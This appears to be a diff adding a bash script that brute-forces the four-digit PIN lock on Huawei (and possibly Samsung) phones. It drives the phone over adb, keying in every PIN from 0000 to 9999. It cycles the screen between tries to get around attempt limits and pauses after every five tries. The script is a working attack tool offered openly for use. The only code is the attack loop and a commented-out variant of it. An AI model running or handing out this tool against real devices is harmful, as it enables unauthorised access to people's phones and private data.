@@ -1,0 +1,108 @@
+#!/bin/bash
+##################################################################################
+##### LICENSE ####################################################################
+##################################################################################
+####                                                                          ####
+#### Copyright (C) 2018 wuseman <info@sendit.nu>                              ####
+####                                                                          ####
+#### This program is free software: you can redistribute it and/or modify     ####
+#### it under the terms of the GNU General Public License as published by     ####
+#### the Free Software Foundation, either version 3 of the License, or        ####
+#### (at your option) any later version.                                      ####
+####                                                                          ####
+#### This program is distributed in the hope that it will be useful,          ####
+#### but WITHOUT ANY WARRANTY; without even the implied warranty of           ####
+#### MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            ####
+#### GNU General Public License at <http://www.gnu.org/licenses/> for         ####
+#### more details.                                                            ####
+####                                                                          ####
+##################################################################################
+##### GREETINGS ##################################################################
+##################################################################################
+####                                                                          ####
+#### To all developers that contributes to all kind of open source projects   ####
+#### Keep up the good work!                                                   #<3#
+####                                                                          ####
+#### https://sendit.nu & https://github.com/wuseman                           ####
+####                                                                          ####
+##################################################################################
+#### DESCRIPTION #################################################################
+##################################################################################
+####                                                                          ####
+#### Bruteforce tool for break the pin lock on smartphones from huawei        ####
+####                                                                          ####
+#### This tool may work for other brands too, samsung got same key inputs     ####
+#### for example, if you wanna get in touch, contact me: info@sendit.nu       ####
+####                                                                          ####
+#### Enjoy another awesome 'bash' script from wuseman. Questions? Conact me!  ####
+####                                                                          ####
+##################################################################################
+#### Begin of code  ##############################################################
+##################################################################################
+
+
+
+echo -e "       _                                   "
+echo -e "      | |                  _               "
+echo -e " _ _ _| |__   ____ _   _ _| |_ _____  ____ "
+echo -e "| | | |  _ \ / ___) | | (_   _) ___ |/ ___) "
+echo -e "| | | | |_) ) |   | |_| | | |_| ____| |    "
+echo -e " \___/|____/|_|   |____/   \__)_____)_|     "
+echo -e "\n"
+echo -e "Please do not touch phone until attack is done..\n"
+echo -e "you can allways cancel the attack by pressing CTRL+c"
+echo -e "--------------------------------------------"
+
+
+#BEGIN="0000"
+#END="9999"
+
+screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
+case $screen in
+     "mScreenState=OFF") echo "Screen is already off! Great, moving on.." ;;
+     "mScreenState=ON_UNLOCKED") echo "Screen is on, locking phone and turning screen off..."; adb shell input keyevent 26 ;;
+esac
+
+  echo -e "\nTurning screen on.."
+   adb shell input keyevent 26 && echo -e "\nSuccessfully started screen..\n" || echo "Failed to power on screen ; exit"
+
+  echo -e "Bruteforce attack will now start, please do not touch phone..."
+        adb shell input keyevent 82
+        adb shell input swipe 407 1211 378 85
+for i in {0000..9999}; do
+echo -e "Trying pin :$i"
+   for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+done
+
+   adb shell input keyevent 66
+   adb shell input swipe 407 1211 378 85
+
+# On older huawei phones you will restart from 4 attempts when you
+# powering off screen and truing again so thats why phone
+# will power off the screen between every attempt, if you got
+# a newer phone it wont help, does not matter, let the phone work.
+   adb shell input keyevent 26
+   adb shell input keyevent 26
+   adb shell input keyevent 82
+
+ if ! (( `expr $i + 1` % 5 )); then
+   adb shell input keyevent 66
+   sleep 30
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+
+ fi
+done
+
+# If the phone does not restart from 0 after 
+# the tool entered the 4 pin you will be able to 
+# use the loop below wich will erase the pin after every attempt 
+# since we do not need press on "enter" on huawei phones ;).
+#------------------------------------------------------------------
+# On huawei we do  not need press enter to login, so we erase 
+# the pincode when have tried a 4digit pin.
+#for i in 1 2 3 4 5; do adb shell input keyevent KEYCODE_DEL; done
+#     adb shell input keyevent 82
+#     adb shell input swipe 407 1211 378 85
+#done
